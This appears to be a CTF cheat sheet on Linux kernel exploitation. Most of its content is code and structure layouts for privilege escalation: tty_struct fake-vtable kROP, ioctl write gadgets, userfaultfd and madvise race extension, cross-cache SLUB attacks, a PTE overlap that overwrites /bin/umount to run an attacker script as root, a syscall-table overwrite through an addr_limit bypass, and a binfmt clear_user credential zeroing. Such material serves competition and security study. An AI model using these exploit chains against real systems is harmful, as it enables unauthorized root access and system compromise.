# CTF Pwn - Kernel Exploitation Techniques

## tty_struct RIP Hijack and kROP

### kROP via Fake Vtable on tty_struct

With sequential write over `tty_struct` (≥0x200 bytes), build two-phase kROP chain entirely within the structure:

```
tty_struct layout:
  +0x00: magic, kref    → 0x5401 (passes paranoia check)
  +0x08: dev            → pop rsp gadget (return addr after leave)
  +0x10: driver         → &tty_struct + 0x170 (stack pivot target)
  +0x18: ops            → &tty_struct + 0x50 (fake vtable)
  +0x50:                → fake vtable, ioctl entry = leave gadget
  +0x170:               → actual ROP chain (commit_creds, etc.)
```

**Flow:** `ioctl(ptmx_fd, cmd, arg)` → `tty_ioctl()` → paranoia check → `tty->ops->ioctl()` → `leave` → `rsp = rbp = tty_struct+0x08` → `ret` → `pop rsp` at `dev` → `rsp = tty_struct+0x170` → ROP runs.

### AAW via ioctl Register Control

```c
// ioctl(fd, cmd, arg) → RDX = arg (fully controlled)
// Gadget: mov DWORD PTR [rdx], esi; ret
// Write 4 bytes at a time via:
for (int i = 0; i < 4; i++) {
    ioctl(ptmx_fd, val, modprobe_path_addr + i*4);
}
```

---

## userfaultfd Race Stabilization

`userfaultfd` pauses kernel at page faults, enabling deterministic race exploitation.

```c
// Setup
int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
struct uffdio_api api = { .api = UFFD_API };
ioctl(uffd, UFFDIO_API, &api);

void *region = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
                    MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
struct uffdio_register reg = {
    .range = { .start = (unsigned long)region, .len = 0x1000 },
    .mode = UFFDIO_REGISTER_MODE_MISSING
};
ioctl(uffd, UFFDIO_REGISTER, &reg);

// Fault handler thread — during block, modify shared state
struct uffd_msg msg;
read(uffd, &msg, sizeof(msg));
// >>> RACE WINDOW: kernel paused <<<
// Free target object, spray heap, etc.
struct uffdio_copy copy = {
    .dst = msg.arg.pagefault.address & ~0xFFF,
    .src = (unsigned long)src_page, .len = 0x1000
};
ioctl(uffd, UFFDIO_COPY, &copy);  // Resume kernel
```

**Alternative when uffd disabled:** Large `copy_from_user()` buffer, CPU pinning + heavy syscalls, repeated attempts, or TSC-based timing.

---

## SLUB Allocator Internals

### Freelist Pointer Hardening (kernel 5.7+)
Free pointers placed in **middle** of object, not offset 0. Simple overflow from chunk start cannot reach free pointer.

### Freelist Obfuscation (CONFIG_SLAB_FREELIST_HARDEN)
Free pointers XOR-obfuscated: `stored_ptr = real_ptr ^ kmem_cache->random`.

---

## Leak via Kernel Panic

```asm
jmp &flag  ; Jump to flag content in memory
```
Kernel panics, `CODE` section in oops message contains flag bytes.

**Requirements:** No KASLR (or layout known), `initramfs` (flag loaded into kernel memory), RIP control.

---

## Race Window Extension via MADV_DONTNEED + mprotect (DiceCTF 2026)

Force repeated page faults to extend narrow race window from milliseconds to seconds:

```c
// Thread 1: trigger vulnerable CHECK ioctl
ioctl(fd, CHECK_ENTRY, &entry);

// Thread 2: extend race window
while (racing) {
    madvise(buf, PAGE_SIZE, MADV_DONTNEED);
    mprotect(buf, PAGE_SIZE, PROT_READ);
    mprotect(buf, PAGE_SIZE, PROT_READ | PROT_WRITE);
}

// Thread 3: trigger DEL ioctl (races with CHECK)
ioctl(fd, DEL_ENTRY, &entry);
```

---

## Cross-Cache Attack via CPU-Split Strategy (DiceCTF 2026)

**Pattern:** Vulnerable object in dedicated SLUB cache. Force pages into buddy allocator by allocating on CPU 0, freeing on CPU 1.

```c
// Pin to CPU 0, allocate MAX_ENTRIES objects
CPU_SET(0, &set);
sched_setaffinity(0, sizeof(set), &set);
for (int i = 0; i < MAX_ENTRIES; i++)
    ioctl(fd, ALLOC_ENTRY, &entries[i]);

// Pin to CPU 1, free from different CPU
CPU_SET(1, &set);
for (int i = 0; i < MAX_ENTRIES; i++)
    ioctl(fd, FREE_ENTRY, &entries[i]);
// Empty slabs flow: CPU1 partial → node partial → PCP → buddy allocator
// Pages now available for reclaim as different object type
```

---

## PTE Overlap Primitive for File Write (DiceCTF 2026)

After cross-cache double-free reclaims page as PTE storage, overlap anonymous writable mapping and read-only file mapping:

```c
// 1. Cross-cache frees page into buddy allocator
// 2. Anonymous mapping reclaims as PTE page
char *anon = mmap(NULL, PAGE_SIZE * 512, PROT_READ|PROT_WRITE,
                  MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
for (int i = 0; i < 512; i++)
    anon[i * PAGE_SIZE] = 'A';  // Populate PTEs in reclaimed page

// 3. File mapping into overlapping virtual range
int fd = open("/bin/umount", O_RDONLY);
char *file_map = mmap(target_addr, PAGE_SIZE, PROT_READ,
                      MAP_PRIVATE|MAP_FIXED, fd, 0);

// 4. Write through anonymous side → modifies file's physical pages
memcpy(anon + offset, "#!/tmp/pwn\n", 11);

// 5. Execute corrupted file → runs attacker script as root
system("/bin/umount /tmp 2>/dev/null");
```

---

## Kernel addr_limit Bypass via Failed File Open (Midnight Sun CTF 2018)

**Pattern:** Kernel module calls `set_fs(KERNEL_DS)` for kernel pointer access, but error path doesn't restore `addr_limit`. Force failure by making target a directory.

```c
// Step 1: Make debug file a directory → filp_open() fails with -EISDIR
mkdir("/tmp/debug_log", 0);

// Step 2: Trigger kernel module's debug function
int fd = open("/dev/vuln_module", O_RDWR);
read(fd, &c, 1);  // Leaves addr_limit = KERNEL_DS

// Step 3: Now read()/write() access kernel memory
// Use pipe as kernel-memory read/write primitive:
int pipefd[2];
pipe(pipefd);
write(pipefd[1], &pkc_addr, sizeof(pkc_addr));
read(pipefd[0], (void*)(SYS_TABLE_ADDR + 100), sizeof(unsigned long));
// Overwrite syscall table → root
```

---

## Custom binfmt Loader OOB Read + clear_user for Privesc (CONFidence Teaser 2019)

**Pattern:** Custom `binfmt` handler parses attacker-controlled header. `header_offset` used unvalidated into `bprm->buf[]` (OOB read of `linux_binprm` struct → leak `bprm->cred`). `loads[i].addr | 8` branch calls `_clear_user(addr, length)` with attacker-controlled arguments before `install_exec_creds()` commits credentials.

```python
# Stage 1: Leak bprm->cred via OOB header_offset
leak = b'P4' + p8(0) + p8(1) + p32(5) + p64(0x80 - 0x18) + p64(0)
# dmesg reveals cred pointer

# Stage 2: Zero uid/gid fields via clear_user
# arg=1, addr | 8 → calls _clear_user(cred->uid..fsgid)
cred = leaked_addr
entries = p64(0x7000000|7) + p64(0x1000) + p64(0)
entries += p64((cred + 0x10) | 8) + p64(0x48) + p64(0)
binary = b'P4' + p8(0) + p8(1) + p32(2) + p64(0x18) + p64(0x7000090) + entries
# exec → install_exec_creds sees uid=0 → root shell
```
